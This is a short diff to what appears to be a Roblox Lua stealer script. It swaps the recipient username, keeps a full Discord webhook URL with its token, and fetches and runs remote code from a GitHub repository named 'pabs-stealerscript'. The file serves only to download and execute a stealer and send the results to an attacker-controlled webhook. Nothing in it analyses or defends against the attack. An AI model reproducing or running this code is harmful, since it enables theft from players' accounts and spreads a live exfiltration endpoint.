@@ -1,4 +1,4 @@
-Username = "evo12342jjj"
+Username = "pablogarote"
 Webhook = "https://discordapp.com/api/webhooks/1370597789746335804/6LCnqNHdhGdEULlYArJ60PH4XkUcCMueKxbQioZ1pJaIsf589qTwUmYeUSIiBsrvy8rw"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/pabs-stealerscript/refs/heads/main/pablows"))()
